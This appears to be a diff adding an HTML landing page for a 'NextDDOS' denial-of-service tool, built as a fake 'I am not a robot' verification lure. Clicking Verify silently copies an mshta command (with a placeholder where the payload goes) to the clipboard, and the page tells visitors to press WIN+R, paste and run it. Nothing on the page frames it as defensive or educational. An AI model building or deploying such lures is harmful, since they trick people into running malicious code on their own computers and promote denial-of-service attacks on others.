@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NextDDOS </title>
+<link rel="icon" href="https://nextinject.w3spaces.com/syringe.png" type="image/png">
+  <meta property="og:title" content="NextDDOS">
+  <meta property="og:description" content="best ddos tool in 2026">
+  <meta property="og:image" content="">
+  <meta property="og:url" content="">
+  <meta property="og:type" content="">
+
+  <script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=jYU_wP_4pHMFBR6F2fbIy-EvgduJHrllprPQLlBZVDWrsyVZyLZjReiB0ugO4jM5FHEr7x1L1ZYvzXKFJcR-oQ" charset="UTF-8"></script>
+
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background-color: black;
+      font-family: 'Courier New', Courier, monospace;
+    }
+
+    .title-container {
+      text-align: center;
+      position: absolute;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .title {
+      font-size: 80px;
+      color: white;
+      text-transform: lowercase;
+      font-weight: bold;
+      letter-spacing: 5px;
+      animation: glowing 1.5s ease-in-out infinite;
+    }
+
+    .slogan {
+      font-size: 24px;
+      color: rgba(255, 255, 255, 0.7);
+      font-weight: 400;
+      margin-top: 10px;
+    }
+
+    @keyframes glowing {
+      0% {
+        text-shadow: 0 0 5px rgba(255,255,255,0.7), 0 0 10px rgba(255,255,255,0.5), 0 0 15px rgba(255,255,255,0.3);
+      }
+      50% {
+        text-shadow: 0 0 15px rgba(255,255,255,1), 0 0 30px rgba(255,255,255,0.7), 0 0 40px rgba(255,255,255,0.5);
+      }
+      100% {
+        text-shadow: 0 0 5px rgba(255,255,255,0.7), 0 0 10px rgba(255,255,255,0.5), 0 0 15px rgba(255,255,255,0.3);
+      }
+    }
+
+    canvas {
+      display: block;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+
+    .verify-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 20px 40px;
+      font-size: 22px;
+      color: white;
+      background: rgba(255, 255, 255, 0.2);
+      border: 2px solid white;
+      border-radius: 5px;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      font-weight: bold;
+      z-index: 1;
+    }
+
+    .verify-button:hover {
+      background: rgba(255, 255, 255, 0.4);
+      box-shadow: 0 0 15px rgba(255,255,255,1), 0 0 25px rgba(255,255,255,0.8);
+    }
+
+    .verify-ui {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 350px;
+      padding: 20px;
+      background: rgba(0,0,0,0.8);
+      border: 1px solid white;
+      text-align: left;
+      display: none;
+      color: white;
+      font-size: 18px;
+      border-radius: 15px;
+      z-index: 1;
+    }
+
+    .verify-ui h1 {
+      font-size: 24px;
+      color: white;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      font-weight: 700;
+      letter-spacing: 2px;
+      border-bottom: 2px solid white;
+      padding-bottom: 5px;
+    }
+
+    .verify-ui ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .verify-ui ul li {
+      margin-bottom: 10px;
+      position: relative;
+      font-size: 18px;
+    }
+
+    .waiting-text {
+      font-size: 16px;
+      color: white;
+      margin-top: 20px;
+      letter-spacing: 2px;
+    }
+
+    .dot {
+      opacity: 0;
+      animation: fadeDots 1.5s infinite ease-in-out;
+    }
+    .dot:nth-child(1) { animation-delay: 0s; }
+    .dot:nth-child(2) { animation-delay: 0.5s; }
+    .dot:nth-child(3) { animation-delay: 1s; }
+
+    @keyframes fadeDots {
+      0% { opacity: 0; }
+      33% { opacity: 0.3; }
+      66% { opacity: 0.6; }
+      100% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <canvas id="canvas"></canvas>
+
+  <div class="title-container">
+    <div class="title">NextDDOS</div>
+    <div class="slogan">best tool to DDOS.</div>
+  </div>
+
+  <button class="verify-button" id="verifyButton">Verify</button>
+
+<div class="verify-ui" id="verifyUI">
+  <h1>Verify</h1>
+  <ul>
+    <li>1. Press WIN + R </li>
+    <li>2. Press CTRL + V in the box</li>
+    <li>3. Press OK</li>
+  </ul>
+  <div class="waiting-text">Waiting for verification <span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
+</div>
+
+
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    resizeCanvas();
+    window.addEventListener('resize', resizeCanvas);
+
+    let mouseX = canvas.width / 2;
+    let mouseY = canvas.height / 2;
+
+    document.addEventListener('mousemove', (e) => {
+      mouseX = e.clientX;
+      mouseY = e.clientY;
+    });
+
+    const stars = [];
+    const STAR_COUNT = 350;
+    const MAX_SPEED = 2;
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+      stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        radius: Math.random() * 2 + 0.5,
+        dx: (Math.random() - 0.5) * MAX_SPEED,
+        dy: (Math.random() - 0.5) * MAX_SPEED
+      });
+    }
+
+    function animateStars() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      stars.forEach(star => {
+        const dx = star.x - mouseX;
+        const dy = star.y - mouseY;
+        const distance = Math.sqrt(dx*dx + dy*dy) || 1;
+
+        const maxDistance = 120;
+        const force = Math.max((maxDistance - distance)/maxDistance, 0);
+
+        if(distance < maxDistance){
+          star.dx += (dx/distance) * force * 0.08;
+          star.dy += (dy/distance) * force * 0.08;
+        }
+
+        const speed = Math.sqrt(star.dx*star.dx + star.dy*star.dy);
+        if(speed > MAX_SPEED){
+          star.dx = (star.dx/speed)*MAX_SPEED;
+          star.dy = (star.dy/speed)*MAX_SPEED;
+        }
+
+        star.x += star.dx;
+        star.y += star.dy;
+
+        if(star.x < 0 || star.x > canvas.width) star.dx *= -1;
+        if(star.y < 0 || star.y > canvas.height) star.dy *= -1;
+
+        ctx.beginPath();
+        ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
+        ctx.fillStyle = 'rgba(255,255,255,0.85)';
+        ctx.fill();
+      });
+
+      requestAnimationFrame(animateStars);
+    }
+
+    animateStars();
+
+const verifyButton = document.getElementById('verifyButton');
+const verifyUI = document.getElementById('verifyUI');
+
+verifyButton.addEventListener('click', async () => {
+  const randomCode = Math.random().toString(36).substring(2, 10).toUpperCase();
+  const textToCopy = `mshta (EXE HERE) # ✅ "I am not a robot - NextDDOS Verification ID: ${randomCode}`;
+
+  try {
+    await navigator.clipboard.writeText(textToCopy);
+    console.log("x:", textToCopy);
+  } catch (e) {
+    console.error("x", e);
+  }
+
+  verifyButton.style.display = 'none';
+  verifyUI.style.display = 'block';
+});
+
+</script>
+<script>
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+let mouseX = canvas.width / 2;
+let mouseY = canvas.height / 2;
+document.addEventListener('mousemove', (e) => {
+  mouseX = e.clientX;
+  mouseY = e.clientY;
+});
+
+const stars = [];
+const STAR_COUNT = 350;
+const MAX_SPEED = 2;
+for (let i = 0; i < STAR_COUNT; i++) {
+  stars.push({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    radius: Math.random() * 2 + 0.5,
+    dx: (Math.random() - 0.5) * MAX_SPEED,
+    dy: (Math.random() - 0.5) * MAX_SPEED
+  });
+}
+
+function animateStars() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  stars.forEach(star => {
+    const dx = star.x - mouseX;
+    const dy = star.y - mouseY;
+    const distance = Math.sqrt(dx*dx + dy*dy) || 1;
+    const maxDistance = 120;
+    const force = Math.max((maxDistance - distance)/maxDistance, 0);
+    if(distance < maxDistance){
+      star.dx += (dx/distance) * force * 0.08;
+      star.dy += (dy/distance) * force * 0.08;
+    }
+    const speed = Math.sqrt(star.dx*star.dx + star.dy*star.dy);
+    if(speed > MAX_SPEED){
+      star.dx = (star.dx/speed)*MAX_SPEED;
+      star.dy = (star.dy/speed)*MAX_SPEED;
+    }
+    star.x += star.dx;
+    star.y += star.dy;
+    if(star.x < 0 || star.x > canvas.width) star.dx *= -1;
+    if(star.y < 0 || star.y > canvas.height) star.dy *= -1;
+    ctx.beginPath();
+    ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
+    ctx.fillStyle = 'rgba(255,255,255,0.85)';
+    ctx.fill();
+  });
+  requestAnimationFrame(animateStars);
+}
+animateStars();
+
+</script>
+</body>
+</html>
